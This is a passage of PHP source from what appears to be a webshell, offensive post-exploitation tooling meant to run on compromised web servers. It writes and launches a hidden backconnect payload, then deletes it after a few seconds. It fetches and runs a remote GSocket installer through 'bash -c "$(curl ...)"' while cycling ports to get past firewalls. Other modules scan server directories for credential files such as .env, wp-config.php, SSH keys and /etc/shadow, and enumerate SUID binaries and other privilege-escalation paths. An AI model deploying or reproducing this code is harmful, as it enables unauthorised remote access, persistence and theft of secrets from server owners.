    $payloadFile = rtrim(str_replace('\\', '/', $tmpDir), '/') . '/.gecko_bc_' . str_replace('.', '', uniqid('', true)) . '.sh';
    $payloadBody = "#!/bin/bash\nset +e\n" . $payload . "\n";
    if (@file_put_contents($payloadFile, $payloadBody) === false) {
        $payloadFile = rtrim(str_replace('\\', '/', $cwd), '/') . '/.gecko_bc_' . str_replace('.', '', uniqid('', true)) . '.sh';
        if (@file_put_contents($payloadFile, $payloadBody) === false) {
            return array('ok' => false, 'error' => 'Cannot write backconnect payload script.');
        }
    }
    @chmod($payloadFile, 0700);

    // Launcher exits immediately; child keeps running under nohup
    $launcher = 'nohup bash ' . geckoEscapeshellarg($payloadFile) . ' >/dev/null 2>&1 &' . "\n"
        . 'PID=$!' . "\n"
        . 'echo "pid=$PID"' . "\n"
        . 'sleep 0.15' . "\n"
        . 'if kill -0 "$PID" 2>/dev/null; then echo "status=running"; else echo "status=exited"; fi' . "\n"
        // Remove launcher copy later — payload file kept briefly so child can start
        . '( sleep 3; rm -f ' . geckoEscapeshellarg($payloadFile) . ' ) >/dev/null 2>&1 &' . "\n";

    $result = geckoRunBashScriptFile($launcher, $cwd, 15);
    if (!empty($result['no_shell']) || (isset($result['output']) && strpos($result['output'], 'Cannot write temp') !== false)) {
        // Fallback: short inline background via runTerminal
        $bg = 'nohup bash ' . geckoEscapeshellarg($payloadFile) . ' >/dev/null 2>&1 & echo pid=$!';
        $result = runTerminal($bg, $cwd, 10, true);
    }

    if (!empty($result['no_shell'])) {
        @unlink($payloadFile);
        return array(
            'ok' => false,
            'error' => !empty($result['output'])
                ? $result['output']
                : 'No shell runner available for backconnect.',
            'method' => $method,
            'hint' => 'Same cascade as Terminal: proc_open / shell_exec / popen / system / passthru / exec.',
        );
    }

    $shellMethod = isset($result['method']) ? $result['method'] : '';
    $out = isset($result['output']) ? trim($result['output']) : '';
    $pid = '';
    if (preg_match('/pid=(\d+)/', $out, $m)) {
        $pid = $m[1];
    }

    $msg = 'Backconnect started (' . $method . ') → ' . $ip . ':' . $port;
    if ($pid !== '') {
        $msg .= ' · pid ' . $pid;
    }
    if ($shellMethod !== '') {
        $msg .= ' · via ' . $shellMethod;
    }

    return array(
        'ok' => true,
        'message' => $msg,
        'shell_method' => $shellMethod,
        'pid' => $pid,
        'target' => $ip . ':' . $port,
        'payload_method' => $method,
        'output' => $out,
    );
}

function gsocketIsFirewalled($output)
{
    $out = strtolower((string)$output);
    return strpos($out, 'cannot connect to gsrn') !== false
        || (strpos($out, 'firewalled') !== false && strpos($out, 'gsrn') !== false);
}

function gsocketBuildScript($method, $port = null)
{
    $method = strtolower(trim((string)$method));
    if ($method === 'wget') {
        $fetch = 'wget --no-check-certificate -qO- https://gsocket.io/y';
    } else {
        $method = 'curl';
        $fetch = 'curl -fsSLk https://gsocket.io/y';
    }
    $script = "export GS_NOCERTCHECK=1\n";
    if ($port !== null) {
        $script .= 'export GS_PORT=' . (int)$port . "\n";
    }
    // Installer from gsocket.io — run in bash
    $script .= 'bash -c "$(' . $fetch . ')"' . "\n";
    return array(
        'script' => $script,
        'command' => trim(str_replace("\n", ' ', $script)),
        'method' => $method,
        'port' => $port,
    );
}

function gsocketBuildCommand($method, $port = null)
{
    $built = gsocketBuildScript($method, $port);
    return array(
        'command' => $built['command'],
        'method' => $built['method'],
        'port' => $built['port'],
    );
}

function runGsocket($method)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => false, 'error' => 'GSocket installer requires bash (Linux/Unix).');
    }
    @set_time_limit(1800);
    @ini_set('max_execution_time', '1800');

    $portsToTry = array(null);
    for ($p = 22; $p <= 67; $p++) {
        $portsToTry[] = $p;
    }

    $allOutput = '';
    $attempts = 0;
    $successPort = null;
    $lastCommand = '';
    $lastMethod = strtolower(trim((string)$method));
    if ($lastMethod !== 'wget') {
        $lastMethod = 'curl';
    }
    $lastExit = 1;
    $stoppedOnFirewalled = false;
    $shellMethodUsed = '';
    $cwd = isset($GLOBALS['baseDir']) ? $GLOBALS['baseDir'] : sys_get_temp_dir();

    foreach ($portsToTry as $port) {
        $built = gsocketBuildScript($method, $port);
        $command = $built['command'];
        $lastCommand = $command;
        $lastMethod = $built['method'];
        $label = ($port === null) ? 'default (no GS_PORT)' : ('GS_PORT=' . $port);
        $attempts++;

        // Always run via temp .sh — complex nested $(curl...) often fails if passed inline to proc_open
        $result = geckoRunBashScriptFile($built['script'], $cwd, 1800);

        // Second chance: inline via runTerminal (short path)
        if (!empty($result['no_shell']) || (isset($result['output']) && strpos($result['output'], 'Cannot write temp') !== false)) {
            $result = runTerminal($command, $cwd, 1800, true);
        }

        if (!empty($result['method'])) {
            $shellMethodUsed = $result['method'];
        }
        if (!empty($result['no_shell'])) {
            return array(
                'ok' => false,
                'error' => !empty($result['output'])
                    ? $result['output']
                    : 'Failed to execute GSocket installer (no shell method).',
                'command' => $command,
                'shell_method' => $shellMethodUsed,
                'hint' => 'Terminal may work for short cmds via proc_open; GSocket needs bash script runner. Ensure bash + curl/wget exist.',
            );
        }

        $lastExit = (int)$result['exit_code'];
        $outText = isset($result['output']) ? $result['output'] : '';
        $firewalled = gsocketIsFirewalled($outText);
        $allOutput .= '=== Attempt ' . $attempts . ': ' . $label . " ===\n";
        if ($shellMethodUsed !== '') {
            $allOutput .= '(shell via ' . $shellMethodUsed . ")\n";
        }
        $allOutput .= '$ ' . $command . "\n\n";
        $allOutput .= $outText . "\n";
        $allOutput .= '(exit ' . $lastExit . ")\n\n";

        if (!$firewalled) {
            $successPort = $port;
            $allOutput .= '=== SUCCESS: GSRN reachable with ' . $label . " ===\n";
            break;
        }

        $stoppedOnFirewalled = true;
        if ($port !== null && $port >= 67) {
            $allOutput .= "=== FAILED: All ports tried (default + GS_PORT=22..67) — still firewalled ===\n";
        }
    }

    $portLabel = ($successPort === null) ? 'default' : (string)$successPort;

    return array(
        'ok' => true,
        'output' => $allOutput,
        'exit_code' => $lastExit,
        'command' => $lastCommand,
        'method' => $lastMethod,
        'shell_method' => $shellMethodUsed,
        'gs_port' => $successPort,
        'gs_port_label' => $portLabel,
        'attempts' => $attempts,
        'firewalled' => ($successPort === null && $stoppedOnFirewalled),
        'success' => ($successPort !== null || !$stoppedOnFirewalled),
    );
}

function runSecTool($tool, $input, $baseDir)
{
    $tool = strtolower(trim((string)$tool));
    switch ($tool) {
        case 'recon':
            return secRecon($baseDir);
        case 'sensitive':
            return secSensitiveScan($baseDir, (string)_v($input, 'path', ''));
        case 'processes':
            return secProcesses($baseDir);
        case 'network':
            return secNetwork($baseDir);
        case 'http':
            return secHttpRequest(
                (string)_v($input, 'url', ''),
                (string)_v($input, 'method', 'GET'),
                (string)_v($input, 'headers', ''),
                (string)_v($input, 'body', '')
            );
        case 'hash':
            return secHash((string)_v($input, 'text', ''), (string)_v($input, 'algo', 'sha256'));
        case 'codec':
            return secCodec((string)_v($input, 'mode', 'b64enc'), (string)_v($input, 'text', ''));
        case 'dns':
            return secDns((string)_v($input, 'host', ''), (string)_v($input, 'type', 'ALL'));
        case 'suid':
            return secSuidFind($baseDir);
        case 'privesc_linux':
            return secPrivescLinux($baseDir);
        case 'privesc_windows':
            return secPrivescWindows($baseDir);
        default:
            return array('ok' => false, 'error' => 'Unknown security tool');
    }
}

function secRecon($baseDir)
{
    $lines = array();
    $lines[] = '=== SYSTEM RECON ===';
    $lines[] = 'Timestamp : ' . date('Y-m-d H:i:s T');
    $lines[] = 'PHP       : ' . PHP_VERSION . ' (' . PHP_SAPI . ')';
    $lines[] = 'OS        : ' . PHP_OS;
    $lines[] = 'Server    : ' . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-');
    $lines[] = 'Hostname  : ' . (function_exists('gethostname') ? gethostname() : '-');
    $lines[] = 'Doc Root  : ' . (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-');
    $lines[] = 'Script    : ' . __FILE__;
    $lines[] = 'Base Dir  : ' . $baseDir;
    $lines[] = 'Client IP : ' . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-');
    $lines[] = '';

    $lines[] = '=== USER / PRIVILEGE ===';
    $lines[] = 'PHP user  : ' . get_current_user();
    if (function_exists('posix_geteuid')) {
        $lines[] = 'UID/EUID  : ' . posix_getuid() . ' / ' . posix_geteuid();
        $pw = @posix_getpwuid(posix_geteuid());
        if ($pw) $lines[] = 'Account   : ' . $pw['name'] . ' (home: ' . (isset($pw['dir']) ? $pw['dir'] : '-') . ')';
        $groups = @posix_getgroups();
        if ($groups) {
            $gn = array();
            foreach ($groups as $gid) {
                $g = @posix_getgrgid($gid);
                $gn[] = $g ? $g['name'] : $gid;
            }
            $lines[] = 'Groups    : ' . implode(', ', $gn);
        }
    }
    $whoami = runTerminal('whoami 2>&1', $baseDir);
    $lines[] = 'whoami    : ' . trim($whoami['output']);
    $id = runTerminal('id 2>&1', $baseDir);
    $lines[] = 'id        : ' . trim($id['output']);
    $lines[] = '';

    $lines[] = '=== PHP SECURITY ===';
    $lines[] = 'disable_functions : ' . (ini_get('disable_functions') ? ini_get('disable_functions') : '(none)');
    $lines[] = 'open_basedir      : ' . (ini_get('open_basedir') ? ini_get('open_basedir') : '(none)');
    $lines[] = 'allow_url_fopen   : ' . (ini_get('allow_url_fopen') ? 'On' : 'Off');
    $lines[] = 'allow_url_include : ' . (ini_get('allow_url_include') ? 'On' : 'Off');
    $lines[] = 'display_errors    : ' . (ini_get('display_errors') ? 'On' : 'Off');
    $lines[] = 'expose_php        : ' . (ini_get('expose_php') ? 'On' : 'Off');
    $lines[] = 'proc_open         : ' . (function_exists('proc_open') && !secFuncDisabled('proc_open') ? 'Available' : 'Disabled');
    $lines[] = 'shell_exec        : ' . (function_exists('shell_exec') && !secFuncDisabled('shell_exec') ? 'Available' : 'Disabled');
    $lines[] = 'curl              : ' . (function_exists('curl_init') ? 'Available' : 'Missing');
    $lines[] = 'PDO               : ' . (class_exists('PDO') ? 'Available' : 'Missing');
    $lines[] = '';

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if (!$isWin) {
        $lines[] = '=== KERNEL / SYSTEM ===';
        $uname = runTerminal('uname -a 2>&1', $baseDir);
        $lines[] = trim($uname['output']);
        $lines[] = 'Uptime: ' . trim(runTerminal('uptime 2>&1', $baseDir)['output']);
        $lines[] = '';
    }

    $lines[] = '=== ENVIRONMENT (selected) ===';
    $envKeys = array('PATH', 'HOME', 'USER', 'LOGNAME', 'SHELL', 'PWD', 'TEMP', 'TMP', 'HTTP_HOST', 'SERVER_NAME');
    foreach ($envKeys as $k) {
        $v = getenv($k);
        if ($v !== false && $v !== '') $lines[] = $k . '=' . $v;
    }

    return array('ok' => true, 'output' => implode("\n", $lines));
}

function secFuncDisabled($fn)
{
    $disabled = ini_get('disable_functions');
    if (!$disabled) return false;
    return in_array($fn, array_map('trim', explode(',', $disabled)), true);
}

function secSensitiveScan($baseDir, $scanPath)
{
    $patterns = array(
        '.env', '.env.local', '.env.production', '.env.backup', '.env.old',
        'wp-config.php', 'configuration.php', 'config.php', 'settings.php', 'LocalSettings.php',
        'database.yml', 'secrets.yml', 'web.config', 'appsettings.json', 'local.settings.json',
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'authorized_keys', '.htpasswd',
        'docker-compose.yml', 'docker-compose.yaml', '.git/config', 'passwd', 'shadow',
        'backup.sql', 'dump.sql', 'db.sql', '.my.cnf', 'pgpass', '.pgpass',
    );
    $roots = array();
    if ($scanPath !== '') {
        $resolved = resolvePath($baseDir, $scanPath, false);
        if ($resolved && @is_dir($resolved)) $roots[] = $resolved;
    }
    if (empty($roots)) {
        $roots[] = $baseDir;
        foreach (array('/var/www', '/home', '/etc', '/tmp', dirname($baseDir)) as $r) {
            if (@is_dir($r) && !in_array($r, $roots, true)) $roots[] = $r;
        }
    }

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $found = array();
    if (!$isWin) {
        $nameExpr = array();
        foreach ($patterns as $p) {
            $nameExpr[] = '-name ' . geckoEscapeshellarg($p);
        }
        $expr = '\( ' . implode(' -o ', $nameExpr) . ' \)';
        foreach ($roots as $root) {
            $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth 7 ' . $expr . ' -type f 2>/dev/null | head -60';
            $out = runTerminal($cmd, $baseDir);
            foreach (explode("\n", $out['output']) as $line) {
                $line = trim($line);
                if ($line !== '' && @is_file($line)) {
                    $found[$line] = array(
                        'path' => $line,
                        'size' => @filesize($line),
                        'perm' => substr(sprintf('%o', @fileperms($line)), -4),
                        'readable' => @is_readable($line),
                    );
                }
            }
            if (count($found) >= 80) break;
        }
    } else {
        secWalkSensitive($roots[0], $patterns, $found, 0, 6);
    }

    $lines = array('=== SENSITIVE FILE SCAN ===', 'Roots: ' . implode(', ', $roots), 'Found: ' . count($found), '');
    foreach ($found as $item) {
        $flag = $item['readable'] ? '[R]' : '[--]';
        $lines[] = $flag . ' ' . $item['perm'] . ' ' . secFormatBytes(isset($item['size']) ? $item['size'] : 0) . '  ' . $item['path'];
    }
    if (empty($found)) $lines[] = '(no sensitive files found in scan scope)';

    return array('ok' => true, 'output' => implode("\n", $lines), 'count' => count($found), 'files' => array_values($found));
}

function secWalkSensitive($dir, $patterns, &$found, $depth, $maxDepth)
{
    if ($depth > $maxDepth || count($found) >= 80) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        if (in_array($name, $patterns, true) && @is_file($full)) {
            $found[$full] = array(
                'path' => $full,
                'size' => @filesize($full),
                'perm' => substr(sprintf('%o', @fileperms($full)), -4),
                'readable' => @is_readable($full),
            );
        }
        if (@is_dir($full) && $depth < $maxDepth) {
            secWalkSensitive($full, $patterns, $found, $depth + 1, $maxDepth);
        }
        if (count($found) >= 80) break;
    }
    closedir($h);
}

function secFormatBytes($bytes)
{
    $bytes = (int)$bytes;
    if ($bytes < 1024) return $bytes . 'B';
    if ($bytes < 1048576) return round($bytes / 1024, 1) . 'K';
    return round($bytes / 1048576, 1) . 'M';
}

function secProcesses($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $cmd = $isWin ? 'tasklist /V' : 'ps auxww 2>/dev/null || ps -ef 2>/dev/null';
    $result = runTerminal($cmd, $baseDir);
    return array('ok' => true, 'output' => $result['output']);
}

function secNetwork($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $cmd = 'netstat -ano';
    } else {
        $cmd = 'ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || netstat -an 2>/dev/null';
    }
    $result = runTerminal($cmd, $baseDir);
    $extra = runTerminal($isWin ? 'ipconfig /all' : 'ip addr 2>/dev/null; echo "---"; ip route 2>/dev/null', $baseDir);
    $out = "=== LISTENING / CONNECTIONS ===\n" . $result['output'] . "\n\n=== INTERFACES / ROUTES ===\n" . $extra['output'];
    return array('ok' => true, 'output' => $out);
}

function secHttpRequest($url, $method, $headersRaw, $body)
{
    $url = trim($url);
    if ($url === '' || !preg_match('#^https?://#i', $url)) {
        return array('ok' => false, 'error' => 'URL must start with http:// or https://');
    }
    $method = strtoupper(trim($method));
    if (!in_array($method, array('GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'), true)) {
        return array('ok' => false, 'error' => 'Invalid HTTP method');
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        if ($body !== '' && in_array($method, array('POST', 'PUT', 'PATCH'), true)) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
        $hdrs = array();
        foreach (preg_split('/\r?\n/', $headersRaw) as $line) {
            $line = trim($line);
            if ($line !== '') $hdrs[] = $line;
        }
        if (!empty($hdrs)) curl_setopt($ch, CURLOPT_HTTPHEADER, $hdrs);
        $resp = curl_exec($ch);
        $err = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        if ($resp === false) return array('ok' => false, 'error' => $err ? $err : 'Request failed');
        $out = "=== HTTP RESPONSE ===\n";
        $out .= 'URL    : ' . $url . "\n";
        $out .= 'Method : ' . $method . "\n";
        $out .= 'Code   : ' . (isset($info['http_code']) ? $info['http_code'] : '?') . "\n";
        $out .= 'Time   : ' . (isset($info['total_time']) ? round($info['total_time'], 3) . 's' : '?') . "\n\n";
        $out .= $resp;
        return array('ok' => true, 'output' => $out);
    }

    $cmd = 'curl -sS -k -i -X ' . geckoEscapeshellarg($method);
    foreach (preg_split('/\r?\n/', $headersRaw) as $line) {
        $line = trim($line);
        if ($line !== '') $cmd .= ' -H ' . geckoEscapeshellarg($line);
    }
    if ($body !== '' && in_array($method, array('POST', 'PUT', 'PATCH'), true)) {
        $cmd .= ' --data ' . geckoEscapeshellarg($body);
    }
    $cmd .= ' ' . geckoEscapeshellarg($url);
    $result = runTerminal($cmd, $GLOBALS['baseDir']);
    return array('ok' => true, 'output' => $result['output']);
}

function secHash($text, $algo)
{
    $algos = array('md5', 'sha1', 'sha256', 'sha512', 'crc32');
    $algo = strtolower(trim($algo));
    if (!in_array($algo, $algos, true)) {
        return array('ok' => false, 'error' => 'Invalid algorithm');
    }
    if ($algo === 'crc32') {
        $hash = sprintf('%u', crc32($text));
    } else {
        $hash = hash($algo, $text);
    }
    $out = "=== HASH ($algo) ===\nInput length: " . strlen($text) . " bytes\n\n" . $hash;
    return array('ok' => true, 'output' => $out, 'hash' => $hash, 'algo' => $algo);
}

function secCodec($mode, $text)
{
    $mode = strtolower(trim($mode));
    $result = '';
    switch ($mode) {
        case 'b64enc':
            $result = base64_encode($text);
            break;
        case 'b64dec':
            $decoded = base64_decode($text, true);
            if ($decoded === false) return array('ok' => false, 'error' => 'Invalid Base64');
            $result = $decoded;
            break;
        case 'urlenc':
            $result = rawurlencode($text);
            break;
        case 'urldec':
            $result = rawurldecode($text);
            break;
        case 'rot13':
            $result = str_rot13($text);
            break;
        case 'hexenc':
            $result = bin2hex($text);
            break;
        case 'hexdec':
            if (!preg_match('/^[0-9a-fA-F\s]+$/', $text)) {
                return array('ok' => false, 'error' => 'Invalid hex string');
            }
            $clean = preg_replace('/\s+/', '', $text);
            if (strlen($clean) % 2 !== 0) return array('ok' => false, 'error' => 'Odd-length hex');
            $result = pack('H*', $clean);
            break;
        default:
            return array('ok' => false, 'error' => 'Unknown codec mode');
    }
    $out = "=== CODEC ($mode) ===\n\n" . $result;
    return array('ok' => true, 'output' => $out, 'result' => $result);
}

function secDns($host, $type)
{
    $host = trim($host);
    if ($host === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $host)) {
        return array('ok' => false, 'error' => 'Invalid hostname');
    }
    if (!function_exists('dns_get_record')) {
        return array('ok' => false, 'error' => 'dns_get_record() not available');
    }
    $type = strtoupper(trim($type));
    $map = array(
        'A' => DNS_A, 'AAAA' => DNS_AAAA, 'MX' => DNS_MX, 'TXT' => DNS_TXT,
        'NS' => DNS_NS, 'CNAME' => DNS_CNAME, 'SOA' => DNS_SOA, 'PTR' => DNS_PTR,
    );
    $lines = array('=== DNS LOOKUP: ' . $host . ' ===', '');
    if ($type === 'ALL') {
        foreach ($map as $label => $const) {
            $recs = @dns_get_record($host, $const);
            if (!empty($recs)) {
                $lines[] = '--- ' . $label . ' ---';
                foreach ($recs as $r) {
                    $lines[] = json_encode($r, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
                }
                $lines[] = '';
            }
        }
    } else {
        if (!isset($map[$type])) return array('ok' => false, 'error' => 'Invalid record type');
        $recs = @dns_get_record($host, $map[$type]);
        if (empty($recs)) {
            $lines[] = '(no ' . $type . ' records)';
        } else {
            foreach ($recs as $r) {
                $lines[] = json_encode($r, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            }
        }
    }
    if (count($lines) <= 2) $lines[] = '(no records found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function secSuidFind($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => true, 'output' => "=== SUID/SGID SCAN ===\nLinux/Unix only.\n");
    }
    $suid = runTerminal('find /usr /bin /sbin /home /opt /tmp /var -perm -4000 -type f 2>/dev/null | head -80', $baseDir);
    $sgid = runTerminal('find /usr /bin /sbin /home /opt /tmp /var -perm -2000 -type f 2>/dev/null | head -40', $baseDir);
    $cap = runTerminal('getcap -r /usr /bin /sbin 2>/dev/null | head -40', $baseDir);
    $out = "=== SUID BINARIES (setuid) ===\n" . trim($suid['output']) . "\n\n";
    $out .= "=== SGID BINARIES (setgid) ===\n" . trim($sgid['output']) . "\n\n";
    $out .= "=== CAPABILITIES ===\n" . trim($cap['output']);
    return array('ok' => true, 'output' => $out);
}

function secPrivescAppendSection(&$lines, $title, $cmd, $baseDir, &$warnCount, $warnPatterns = null)
{
    $lines[] = '--- ' . $title . ' ---';
    $result = runTerminal($cmd, $baseDir);
    $body = trim($result['output']);
    if ($body === '') {
        $lines[] = '(no output / not accessible)';
    } else {
        if (is_array($warnPatterns)) {
            foreach (explode("\n", $body) as $row) {
                $row = rtrim($row);
                if ($row === '') continue;
                $flagged = false;
                foreach ($warnPatterns as $pat) {
                    if (@preg_match($pat, $row)) {
                        $flagged = true;
                        break;
                    }
                }
                if ($flagged) {
                    $warnCount++;
                    $lines[] = '[WARN] ' . $row;
                } else {
                    $lines[] = $row;
                }
            }
        } else {
            $lines[] = $body;
            if ($warnPatterns && @preg_match($warnPatterns, $body)) {
                $warnCount++;
                $lines[] = '[WARN] Suspicious finding in section above';
            }
        }
    }
    $lines[] = '';
}

function secPrivescKnownSuidBins()
{
    return array(
        'python', 'python3', 'perl', 'ruby', 'lua', 'php', 'node',
        'find', 'nmap', 'vim', 'vi', 'nano', 'less', 'more', 'view',
        'awk', 'gawk', 'mawk', 'gcc', 'cc', 'cp', 'mv', 'tar', 'zip',
        'unzip', 'base64', 'env', 'timeout', 'watch', 'strace', 'gdb',
        'docker', 'pkexec', 'newgrp', 'dash', 'ash', 'busybox', 'mount', 'umount',
        'systemctl', 'journalctl', 'logsave', 'cpulimit', 'at', 'crontab',
    );
}

function secPrivescLinux($baseDir)
{
    @set_time_limit(300);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array(
            'ok' => true,
            'output' => "=== LINUX PRIVILEGE ESCALATION AUDIT ===\nRun this audit on a Linux host (current: Windows).\nUse 'Privesc Windows' for this machine.\n",
            'count' => 0,
        );
    }

    $warnCount = 0;
    $lines = array(
        '=== LINUX PRIVILEGE ESCALATION AUDIT ===',
        'Timestamp: ' . date('Y-m-d H:i:s T'),
        'Host: ' . (function_exists('gethostname') ? gethostname() : '-'),
        '',
    );

    secPrivescAppendSection($lines, '[1] IDENTITY (whoami / id)', 'id 2>&1; echo ---; whoami 2>&1', $baseDir, $warnCount);
    secPrivescAppendSection($lines, '[2] SUDO PRIVILEGES', 'sudo -l 2>&1', $baseDir, $warnCount, array(
        '/NOPASSWD/i', '/\(ALL\s*:\s*ALL\)/i', '/\(ALL\)\s+ALL/i', '/env_keep/i',
    ));

    $lines[] = '--- [3] SUID BINARIES (GTFOBins highlight) ---';
    $suidOut = runTerminal('find /usr /bin /sbin /lib /lib64 /opt /home /tmp /var -perm -4000 -type f 2>/dev/null | head -100', $baseDir);
    $known = secPrivescKnownSuidBins();
    $suidLines = array_filter(array_map('trim', explode("\n", $suidOut['output'])));
    if (empty($suidLines)) {
        $lines[] = '(none found or not accessible)';
    } else {
        foreach ($suidLines as $path) {
            $bn = strtolower(basename($path));
            $hit = false;
            foreach ($known as $k) {
                if ($bn === $k || strpos($bn, $k) === 0) {
                    $hit = true;
                    break;
                }
            }
            if ($hit) {
                $warnCount++;
                $lines[] = '[WARN] ' . $path . '  ← known GTFOBins candidate';
            } else {
                $lines[] = '[INFO] ' . $path;
            }
        }
    }
    $lines[] = '';

    secPrivescAppendSection($lines, '[4] SGID BINARIES', 'find /usr /bin /sbin /opt -perm -2000 -type f 2>/dev/null | head -50', $baseDir, $warnCount);
    secPrivescAppendSection($lines, '[5] FILE CAPABILITIES', 'getcap -r /usr /bin /sbin /opt 2>/dev/null | head -50', $baseDir, $warnCount, array(
        '/cap_setuid/i', '/cap_setgid/i', '/cap_sys_admin/i', '/cap_dac_override/i', '/cap_sys_ptrace/i',
    ));

    secPrivescAppendSection($lines, '[6] WRITABLE /etc FILES', 'find /etc -maxdepth 3 -type f -writable 2>/dev/null | head -40', $baseDir, $warnCount, array(
        '/\/etc\/passwd$/i', '/\/etc\/shadow$/i', '/\/etc\/sudoers/i', '/\/etc\/cron/i', '/\/etc\/systemd/i',
    ));

    secPrivescAppendSection($lines, '[7] WORLD-WRITABLE DIRS (PATH risk)', 'find /usr/local/bin /usr/local/sbin /opt /tmp /var/tmp /dev/shm -type d -perm -0002 2>/dev/null | head -30', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[8] DOCKER / LXD GROUP', 'ls -la /var/run/docker.sock 2>/dev/null; echo ---; groups 2>&1; echo ---; id 2>&1', $baseDir, $warnCount, '/docker|lxd|libvirt|disk|adm|sudo|wheel/i');

    secPrivescAppendSection($lines, '[9] KERNEL & OS', 'uname -a 2>&1; echo ---; cat /etc/os-release 2>/dev/null | head -8', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[10] MOUNT OPTIONS (nosuid/nodev)', 'mount 2>/dev/null | grep -E "nosuid|nodev|nouser" | head -20', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[11] NFS EXPORTS', 'cat /etc/exports 2>/dev/null; showmount -e 127.0.0.1 2>/dev/null', $baseDir, $warnCount, '/no_root_squash/i');

    secPrivescAppendSection($lines, '[12] NON-ROOT UID 0 ACCOUNTS', 'awk -F: \'($3==0 && $1!="root"){print}\' /etc/passwd 2>/dev/null', $baseDir, $warnCount, '/./');

    secPrivescAppendSection($lines, '[13] PASSWORDLESS / EMPTY HASH', 'awk -F: \'($2=="" || $2=="!" || $2=="*"){print $1":"$2}\' /etc/passwd 2>/dev/null | head -20', $baseDir, $warnCount, '/^[^:]+:$/');

    secPrivescAppendSection($lines, '[14] CRON WRITABLE', 'find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null | head -20', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[15] SYSTEMD WRITABLE UNITS', 'find /etc/systemd /lib/systemd -type f -writable 2>/dev/null | head -20', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[16] PROCESSES (root / interesting)', 'ps auxww 2>/dev/null | grep -E "^root|mysql|postgres|redis|docker" | grep -v grep | head -25', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[17] INTERNAL LISTEN PORTS', 'ss -tulpn 2>/dev/null | head -25; echo ---; netstat -tulpn 2>/dev/null | head -25', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[18] SSH CONFIG WEAKNESS', 'grep -iE "^PermitRootLogin|^PasswordAuthentication|^PubkeyAuthentication" /etc/ssh/sshd_config 2>/dev/null', $baseDir, $warnCount, array(
        '/PermitRootLogin\s+yes/i', '/PasswordAuthentication\s+yes/i',
    ));

    secPrivescAppendSection($lines, '[19] RECENTLY MODIFIED SUID (7d)', 'find /usr /bin /sbin /opt /tmp -perm -4000 -type f -mtime -7 2>/dev/null | head -20', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[20] PHP / WEB CONTEXT', 'echo "User: $(whoami)"; echo "Groups: $(id)"; php -r "echo get_current_user().PHP_EOL;" 2>/dev/null', $baseDir, $warnCount);

    $lines[] = str_repeat('=', 52);
    $lines[] = 'SUMMARY: ' . $warnCount . ' warning(s) — review [WARN] lines (manual validation required)';
    if ($warnCount === 0) {
        $lines[] = 'No automated high-risk patterns matched. Continue with manual enum (LinPEAS, pspy, etc.).';
    }

    return array(
        'ok' => true,
        'output' => implode("\n", $lines),
        'count' => $warnCount,
        'critical' => $warnCount,
    );
}

function secPrivescWindows($baseDir)
{
    @set_time_limit(300);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if (!$isWin) {
        return array(
            'ok' => true,
            'output' => "=== WINDOWS PRIVILEGE ESCALATION AUDIT ===\nRun this audit on a Windows host (current: Linux/Unix).\nUse 'Privesc Linux' for this machine.\n",
            'count' => 0,
        );
    }

    $warnCount = 0;
    $lines = array(
        '=== WINDOWS PRIVILEGE ESCALATION AUDIT ===',
        'Timestamp: ' . date('Y-m-d H:i:s T'),
        'Computer: ' . trim(runTerminal('hostname', $baseDir)['output']),
        '',
    );

    secPrivescAppendSection($lines, '[1] WHOAMI (user / groups)', 'whoami /all 2>nul', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[2] PRIVILEGES (whoami /priv)', 'whoami /priv 2>nul', $baseDir, $warnCount, array(
        '/SeImpersonatePrivilege\s+Enabled/i', '/SeAssignPrimaryTokenPrivilege\s+Enabled/i',
